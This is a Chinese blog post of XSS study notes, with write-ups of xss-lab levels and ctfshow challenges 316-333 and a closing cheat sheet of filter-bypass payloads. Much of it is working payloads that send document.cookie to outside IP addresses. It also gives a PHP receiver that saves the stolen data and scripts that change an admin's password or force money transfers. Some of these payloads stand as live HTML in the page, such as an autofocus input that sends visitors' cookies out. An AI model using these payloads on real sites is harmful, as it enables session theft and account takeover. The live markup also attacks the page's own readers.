<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="xss(跨站脚本攻击)有反射型xss，存储型xss和dom型xss反射型xss用户将恶意代码嵌入到网页中，后台执行恶意代码，将结果返回给用户 存储型xss将恶意代码写入到数据库中去，当用户访问页面时，会执行这些恶意代码，这种影响范围广，常见于留言板之类的 dom型xss是一种特殊的反射型xss，区别在于dom型xss不会将恶意代码交到后台执行，而是直接有网页的JavaScript执行 常见的测试手">
<meta property="og:type" content="article">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/2022/04/05/xss(%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB)/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="xss(跨站脚本攻击)有反射型xss，存储型xss和dom型xss反射型xss用户将恶意代码嵌入到网页中，后台执行恶意代码，将结果返回给用户 存储型xss将恶意代码写入到数据库中去，当用户访问页面时，会执行这些恶意代码，这种影响范围广，常见于留言板之类的 dom型xss是一种特殊的反射型xss，区别在于dom型xss不会将恶意代码交到后台执行，而是直接有网页的JavaScript执行 常见的测试手">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="c:/Users/victory/AppData/Roaming/Typora/draftsRecover/%23">
<meta property="og:image" content="d:/boke/source_posts/文件包含/image-20220403154202608.png">
<meta property="og:image" content="d:/boke/source_posts/文件包含/image-20220403154358480.png">
<meta property="og:image" content="d:/boke/source_posts/文件包含/image-20220403160214221.png">
<meta property="og:image" content="d:/boke/source_posts/文件包含/image-20220403222837693.png">
<meta property="og:image" content="d:/boke/source_posts/文件包含/image-20220403223105490.png">
<meta property="og:image" content="d:/boke/source_posts/文件包含/image-20220404110019888.png">
<meta property="og:image" content="d:/boke/source_posts/文件包含/image-20220404110622876.png">
<meta property="article:published_time" content="2022-04-05T04:15:35.730Z">
<meta property="article:modified_time" content="2022-04-05T04:15:35.730Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="c:/Users/victory/AppData/Roaming/Typora/draftsRecover/%23">

<link rel="canonical" href="http://example.com/2022/04/05/xss(%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB)/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title> | Hexo</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Hexo</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/05/xss(%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB)/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-04-05 12:15:35" itemprop="dateCreated datePublished" datetime="2022-04-05T12:15:35+08:00">2022-04-05</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="xss-跨站脚本攻击"><a href="#xss-跨站脚本攻击" class="headerlink" title="xss(跨站脚本攻击)"></a>xss(跨站脚本攻击)</h2><h4 id="有反射型xss，存储型xss和dom型xss"><a href="#有反射型xss，存储型xss和dom型xss" class="headerlink" title="有反射型xss，存储型xss和dom型xss"></a>有反射型xss，存储型xss和dom型xss</h4><h5 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h5><p>用户将恶意代码嵌入到网页中，后台执行恶意代码，将结果返回给用户</p>
<h5 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h5><p>将恶意代码写入到数据库中去，当用户访问页面时，会执行这些恶意代码，这种影响范围广，常见于留言板之类的</p>
<h5 id="dom型xss"><a href="#dom型xss" class="headerlink" title="dom型xss"></a>dom型xss</h5><p>是一种特殊的反射型xss，区别在于dom型xss不会将恶意代码交到后台执行，而是直接有网页的JavaScript执行</p>
<h5 id="常见的测试手法"><a href="#常见的测试手法" class="headerlink" title="常见的测试手法"></a>常见的测试手法</h5><p>通常用输入特殊字符如‘ “ `* &lt;&gt;测试，看返回结果</p>
<p>注入语句</p>
<p>  1、   <strong><img src="C:/Users/victory/AppData/Roaming/Typora/draftsRecover/%23" onmouseover="alert('xss')">（img代表图片，src代表图片路径</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt; &lt;img src=&quot;&quot; onerror=alert(1)&gt;   oneerror 一出错就执行，由于src=空值所以会出错</span><br></pre></td></tr></table></figure>



<p>2、’ onclick=”alert(‘xss’)”&gt; （第一个‘是为了闭合前面的，这种是不用闭合前面的是在a标签附加内部属性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onfocus=alert(1)&gt;  // a标签内部加属性</span><br></pre></td></tr></table></figure>



<p>3、利用JavaScript伪协议</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(&quot;You are attacked !!&quot;)</span><br></pre></td></tr></table></figure>

<p>4、’&gt; <img src="" onerror=alert(1)>  // 闭合出a标签, 将img标签嵌入上一级div执行</p>
<p>借鉴：<a target="_blank" rel="noopener" href="https://blog.csdn.net/angry_program/article/details/104373952">https://blog.csdn.net/angry_program/article/details/104373952</a></p>
<p>==<strong>XSS之htmlspecialchars</strong>==<br>htmlspecialchars() 函数<br>PHP里面把预定义的字符转换为HTML实体的函数</p>
<p>预定义的字符是</p>
<p>&amp; 成为 &amp;amp<br>“ 成为 &amp;quot<br>‘ 成为 &amp;#039<br>&lt; 成为 &amp;lt</p>
<blockquote>
<p>成为 &amp;gt<br>可用引号类型</p>
</blockquote>
<p>ENT_COMPAT：默认，仅编码双引号<br>ENT_QUOTES：编码双引号和单引号<br>ENT_NOQUOTES：不编码任何引号<br>————————————————</p>
<h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><h3 id="xss-lab"><a href="#xss-lab" class="headerlink" title="==xss -lab=="></a>==xss -lab==</h3><h4 id="level3-htmlspecialchars绕过-一般在input或者JavaScript"><a href="#level3-htmlspecialchars绕过-一般在input或者JavaScript" class="headerlink" title="level3       htmlspecialchars绕过  一般在input或者JavaScript"></a>level3       htmlspecialchars绕过  一般在input或者JavaScript</h4><p><img src="D:\boke\source_posts\文件包含\image-20220403154202608.png" alt="image-20220403154202608"></p>
<p><img src="D:\boke\source_posts\文件包含\image-20220403154358480.png" alt="image-20220403154358480"></p>
<p>playload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27; οninput=alert`1` //      当要在input中输入内容时触发事件</span><br><span class="line">&#x27; οninput=alert`1` &#x27;       同上</span><br><span class="line">&#x27; οnchange=alert`1` //  发生改变的时候触发该事件</span><br><span class="line">&#x27; οnchange=alert`1` &#x27;   同上</span><br></pre></td></tr></table></figure>

<p>这题构造</p>
<p> ‘ onmouseover=‘javascript:alert(1)</p>
<p>我也不知道为什么onclick不行</p>
<h4 id="lever4"><a href="#lever4" class="headerlink" title="lever4"></a>lever4</h4><p><img src="D:\boke\source_posts\文件包含\image-20220403160214221.png" alt="image-20220403160214221"></p>
<h4 id="level5-过滤了on"><a href="#level5-过滤了on" class="headerlink" title="level5  过滤了on"></a>level5  过滤了on</h4><p>第五关：<br>先试探防御机制，这一关把ri转换为r_i，所以考虑绕过该机制</p>
<p><scr_ipt>alert(1)</script></p>
<p>采用大小写同样会被转换，所以换一个不带ri的标签</p>
<p>“&gt;&lt;img src=1 o_nerror=alert(1)</p>
<p>==<strong>然后发现on也被过滤了，而且所有的事件属性都是带有on的，所以在此处无法采用事件</strong>==</p>
<p>采用其他标签：</p>
<p>“&gt;&lt;a href=”javascript:alert(1)”</p>
<p>h还可以用data  或者src标签</p>
<h4 id="level6-比五多过滤了href"><a href="#level6-比五多过滤了href" class="headerlink" title="level6  比五多过滤了href"></a>level6  比五多过滤了href</h4><p>但是没有过滤大小写，直接用大小写就可以通过</p>
<h4 id="level7-学习嵌套注入的方法-适用于替换成空格"><a href="#level7-学习嵌套注入的方法-适用于替换成空格" class="headerlink" title="level7           学习嵌套注入的方法(适用于替换成空格)"></a>level7           学习嵌套注入的方法(适用于替换成空格)</h4><p>第七关：<br>通过试探，发现script被过滤了：</p>
<p>&lt;&gt;alert(1)&lt;/&gt;</p>
<p>所有采用嵌套的方法：</p>
<p><scscriptript>alert(1)</scrscriptipt></p>
<p>发现可以使用，然后构造闭合：</p>
<p>“&gt;<scscriptript>alert(1)</scrscriptipt></p>
<p>采用事件注入：</p>
<p>“  onclick=”alert(1)”</p>
<p>on被过滤，所以嵌套注入</p>
<p>“  oonnclick=”alert(1)”</p>
<p>查看源码：</p>
<p>$str =strtolower( $_GET[“keyword”]);<br>$str2=str_replace(“script”,””,$str);<br>$str3=str_replace(“on”,””,$str2);<br>$str4=str_replace(“src”,””,$str3);<br>$str5=str_replace(“data”,””,$str4);<br>$str6=str_replace(“href”,””,$str5);</p>
<p>本关与上一关的不同，在于转换后的内容不同，虽然添加了大小写转换，但是因为转换后，字符被转换为空字符，所以转换后的字符如何仍可以组合成，那么就可以绕过该防御机制</p>
<h4 id="level8-学习实体编码绕过"><a href="#level8-学习实体编码绕过" class="headerlink" title="level8 学习实体编码绕过"></a>level8 学习实体编码绕过</h4><p>通过试探，发现无法构造闭合，采用是采用了htmlspecialchars($str)函数，而且闭合方式是双引号，所以input中无法注入，但是在连接里面是有地方可以注入的，首先是试探是否有防御机制：</p>
<p>javascr_ipt:alert(1)</p>
<p>发现与第6关一样，做了过滤，采用html实体编码</p>
<p>java&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)</p>
<p>查看源码：</p>
<p>$str = strtolower($_GET[“keyword”]);<br>$str2=str_replace(“script”,”scr_ipt”,$str);<br>$str3=str_replace(“on”,”o_n”,$str2);<br>$str4=str_replace(“src”,”sr_c”,$str3);<br>$str5=str_replace(“data”,”da_ta”,$str4);<br>$str6=str_replace(“href”,”hr_ef”,$str5);<br>$str7=str_replace(‘“‘,’&amp;quot’,$str6);</p>
<p>这一关基本过滤了所以关键字和大小写，所以采用html实体编码</p>
<h4 id="9"><a href="#9" class="headerlink" title="9"></a>9</h4><p>LV9</p>
<p>注释符绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>             源码</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===strpos(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>要求插入字符中必须有http://</p>
<p>其他与lv8相同</p>
<p>javascrip&#x74;:alert(1)//<a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a> //利用注释</p>
<p>javascrip&#x74;:%0 d<a href="http://xxx.com%0dalert(1)">http://xxx.com%0dalert(1)</a> //不利用注释</p>
<p>javascrip&#x74;:%0 a<a href="http://xxx.com%0daalert(1)">http://xxx.com%0daalert(1)</a> //不利用注释</p>
<p>java&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(‘http://‘)</p>
<h3 id="ctfshow"><a href="#ctfshow" class="headerlink" title="==ctfshow=="></a>==<strong>ctfshow</strong>==</h3><h4 id="316-利用alert弹出管理员的cookie"><a href="#316-利用alert弹出管理员的cookie" class="headerlink" title="316 利用alert弹出管理员的cookie"></a>316 利用alert弹出管理员的cookie</h4><p>  在这里借用了xss平台：<a target="_blank" rel="noopener" href="http://xsscom.com//index.php">http://xsscom.com//index.php</a>?</p>
<p>这题没有任何的过滤</p>
<p><img src="D:\boke\source_posts\文件包含\image-20220403222837693.png" alt="image-20220403222837693"></p>
<p>在这里我们借用xss平台，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=http://xsscom.com//4Be5Rm&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">src是网站路径，当管理源登录后台，就会将管理源的cookie弹到src指定的网站里面，然后在网站的项目管理就可可以查看内容</span><br></pre></td></tr></table></figure>

<p><img src="D:\boke\source_posts\文件包含\image-20220403223105490.png" alt="image-20220403223105490"></p>
<h4 id="317、318、319"><a href="#317、318、319" class="headerlink" title="317、318、319"></a>317、318、319</h4><p>题目还是一样，多次尝试之后发现过滤了script，大写也不行，尝试写了个<input onmouseover='alert(11)'>,（有个问题需要点击我插入的输入框才可以弹出）发现真的可以，</p>
<p>但是我尝试&lt;input src=<a target="_blank" rel="noopener" href="http://xsscom.com//4Be5Rm,onmouseover=alert(document.cookie)&gt;%EF%BC%8C%E5%8D%B4%E6%97%A0%E6%B3%95%E5%BC%B9%E5%87%BA%EF%BC%8C%EF%BC%88%E5%8F%AF%E8%83%BD%E6%98%AF%E6%9C%BA%E5%99%A8%E4%BA%BA%E4%B8%8D%E4%BC%9A%E7%82%B9%E5%87%BB%E6%88%91%E6%8F%92%E5%85%A5%E7%9A%84%E9%82%A3%E4%B8%AA%E6%A1%86%EF%BC%89">http://xsscom.com//4Be5Rm,onmouseover=alert(document.cookie)&gt;，却无法弹出，（可能是机器人不会点击我插入的那个框）</a></p>
<input onfocus="window.open('http://175.178.61.16/1.php?1='+document.cookie)" autofocus>

<p>新方法：利用外带的方式（也就是自己的vps）</p>
<p>在自己的网站写下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">我的是1.php</span><br><span class="line">&lt;?php</span><br><span class="line">$content=$_GET[1];</span><br><span class="line">if(isset($content))&#123;</span><br><span class="line">    file_put_contents(&#x27;flag.txt&#x27;,$content);</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    echo &#x27;no data&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后插入语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=&quot;window.open(&#x27;http://175.178.61.16/1.php?1=&#x27;+document.cookie)&quot; autofocus&gt;</span><br><span class="line">查看flag.txt就可以了</span><br></pre></td></tr></table></figure>

<h6 id="常用的插入"><a href="#常用的插入" class="headerlink" title="常用的插入"></a>常用的插入</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://118.31.168.198:39543/&#x27;+document.cookie)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;window.location.href=&#x27;http://118.31.168.198:39543/&#x27;+document.cookie&lt;/script&gt;</span><br><span class="line">&lt;script&gt;location.href=&#x27;http://118.31.168.198:39543/&#x27;+document.cookie&lt;/script&gt;</span><br><span class="line">&lt;input onfocus=&quot;window.open(&#x27;http://118.31.168.198:39543/&#x27;+document.cookie)&quot; autofocus&gt;</span><br><span class="line">通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line">&lt;svg onload=&quot;window.open(&#x27;http://118.31.168.198:39543/&#x27;+document.cookie)&quot;&gt;</span><br><span class="line">&lt;iframe onload=&quot;window.open(&#x27;http://118.31.168.198:39543/&#x27;+document.cookie)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;body onload=&quot;window.open(&#x27;http://118.31.168.198:39543/&#x27;+document.cookie)&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="320-321-322-327-过滤了xss完全没影响"><a href="#320-321-322-327-过滤了xss完全没影响" class="headerlink" title="320 321 322-327(过滤了xss完全没影响)"></a>320 321 322-327(过滤了xss完全没影响)</h4><p>比之前多过滤了空格可以用（tab或者/**/)</p>
<p>&lt;body/**/onload=”document.location.href=’<a target="_blank" rel="noopener" href="http://175.178.61.16/1.php?1=&#39;+document.cookie&quot;&gt;">http://175.178.61.16/1.php?1=&#39;+document.cookie&quot;&gt;</a></body></p>
<h4 id="328-存储型xss"><a href="#328-存储型xss" class="headerlink" title="328 存储型xss"></a>328 存储型xss</h4><p>这题需要我们获得管理员的sesionid 然后登入</p>
<p><img src="D:\boke\source_posts\文件包含\image-20220404110019888.png" alt="image-20220404110019888"></p>
<p>在名字或者密码中插入js，当管理员访问时，就会执行我们 js代码，然后获得他的phpsessid，再冒充管理员登入</p>
<p><img src="D:\boke\source_posts\文件包含\image-20220404110622876.png" alt="image-20220404110622876"></p>
<h4 id="329"><a href="#329" class="headerlink" title="329"></a>329</h4><script>window.open('http://175.178.61.16/1.php?1='+document.getElementsByClassName('layui-table-cell laytable-cell-1-0-1'))</script>

<p>————————————————</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&#x27;.laytable-cell-1-0-1&#x27;</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params">index,value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(value.innerHTML.indexOf(<span class="string">&#x27;ctf&#x27;</span>+<span class="string">&#x27;show&#123;&#x27;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">window</span>.location.href=<span class="string">&#x27;http://175.178.61.16/1.php?1=&#x27;</span>+value.innerHTML; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>$(‘.laytable-cell-1-0-1’).each(function(index,value){<br>                if(value.innerHTML.indexof(‘ctf‘+’show{‘)&gt;-1){window.location.href=’<a target="_blank" rel="noopener" href="http://175.178.61.16/1.php?1=&#39;+value.innerHTML;}}">http://175.178.61.16/1.php?1=&#39;+value.innerHTML;}}</a>);</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&#x27;.laytable-cell-1-0-1&#x27;</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params">index,value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(value.innerHTML.indexOf(<span class="string">&#x27;ctf&#x27;</span>+<span class="string">&#x27;show&#x27;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">window</span>.location.href=<span class="string">&#x27;http://175.178.61.16/1.php?1=&#x27;</span>+value.innerHTML;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="330-比之前多了个修改模块"><a href="#330-比之前多了个修改模块" class="headerlink" title="330 比之前多了个修改模块"></a>330 比之前多了个修改模块</h4><p>做法：构建一个修改密码的js，当admin访问管理员这个模块的时候，执行我们的js代码，修改admin的密码</p>
<script>window.open('http://127.0.0.1/api/change?p=123')    有可能不对可以自己抓包试一下



#### 331 提交的方式改为了post 这时候需要使用ajax提交

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">      url:&#x27;api/change.php&#x27;,            </span><br><span class="line">      type:&#x27;post&#x27;,</span><br><span class="line">      data:&#123;p:123&#125;,</span><br><span class="line">      &#125;)</span><br></pre></td></tr></table></figure>

#### 332

而利用负数漏洞

#### 333

第一个方法是注册一个账户，然后一直自己给自己转账，翻倍，最后购买flag。
 第二个方法是通过XSS Payload，让管理员转账给自己的账户。
 看看转账的包：



![img](https:////upload-images.jianshu.io/upload_images/26144645-a8041e5436b3bb78.png?imageMogr2/auto-orient/strip|imageView2/2/w/539/format/webp)

那么先注册一个123用户，再注册一个用户名如下的用户即可:



<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$.ajax(&#123;<span class="attr">url</span>:<span class="string">&#x27;api/amount.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">u</span>:<span class="string">&#x27;123&#x27;</span>,<span class="attr">a</span>:<span class="string">&#x27;10000&#x27;</span>&#125;&#125;);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



## ==0x02：总结==

### XSS常用的测试语句

- <script>alert(1)</script>
<ul>
<li>&lt;img src=x οnerrοr=alert(1)&gt;</li>
<li>&lt;svg οnlοad=alert(1)&gt;</li>
<li><a href=javascript:alert(1)></li>
</ul>
<h3 id="xss绕过方法"><a href="#xss绕过方法" class="headerlink" title="xss绕过方法"></a>xss绕过方法</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><Script>alert(1)</Script>

<h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p><scrscriptipt>alert(1)</scrscriptipt></p>
<h4 id="替换绕过"><a href="#替换绕过" class="headerlink" title="替换绕过"></a>替换绕过</h4><p>过滤 alert 用prompt，confirm，top<a href="1">‘alert’</a>代替绕过</p>
<p>过滤() 用``代替绕过</p>
<p>过滤空格 用%0a（换行符）,%0d（回车符），/**/代替绕过</p>
<p>小写转大写情况下 字符ſ大写后为S（ſ不等于s）</p>
<h4 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="%00截断绕过"></a>%00截断绕过</h4><p><a href=javascr%00ipt:alert(1)>xss</a></p>
<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><ul>
<li>HTML实体编码</li>
</ul>
<p>命名实体：以&amp;开头，以分号结尾，例如“&lt;”的编码是“&lt;”</p>
<p>字符编码：十进制、十六进制ASCII码或Unicode字符编码，样式为“&amp;#数值;”</p>
<p>javascrip&#x74;:alert(1) 十六进制</p>
<p>javascrip&#116;:alert(1) 十进制</p>
<p>或</p>
<p>javascrip\u0074:alert(1)</p>
<ul>
<li>JS编码</li>
</ul>
<p>①三个八进制数字，如果个数不够，在前面补0，例如“e”的编码为“\145”（e的八进制ASCII码）</p>
<p>②两个十六进制数字，如果个数不够，在前面补0，e的编码为“\x65”</p>
<p>③四个十六进制数字，“\x0065”</p>
<p>④对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）</p>
<ul>
<li>url编码</li>
</ul>
<p>javascrip%74:alert(1)</p>
<h4 id="fromCharCode方法绕过"><a href="#fromCharCode方法绕过" class="headerlink" title="fromCharCode方法绕过"></a>fromCharCode方法绕过</h4><p>String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)</p>
<p>eval(FromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))</p>
<h4 id="javascript伪协议绕过"><a href="#javascript伪协议绕过" class="headerlink" title="javascript伪协议绕过"></a>javascript伪协议绕过</h4><p>无法闭合双引号的情况下，就无法使用onclick等事件，只能伪协议绕过，或者调用外部js</p>
<h4 id="换行绕过正则匹配"><a href="#换行绕过正则匹配" class="headerlink" title="换行绕过正则匹配"></a>换行绕过正则匹配</h4><p>onmousedown</p>
<p>=alert(1)</p>
<h4 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h4><p>// 单行注释</p>
<!-- --!> 注释多行内容

<!-- --> 注释多行内容

<p>&lt;– –&gt; 注释多行内容</p>
<p>&lt;– –！&gt; 注释多行内容</p>
<p>–&gt; 单行注释后面内容</p>
<p>/* */ 多行注释</p>
<p>有时还可以利用浏览器的容错性，不需要注释</p>
<h4 id="闭合标签空格绕过"><a href="#闭合标签空格绕过" class="headerlink" title="闭合标签空格绕过"></a>闭合标签空格绕过</h4><p></style ><script>alert(1)</script></p>
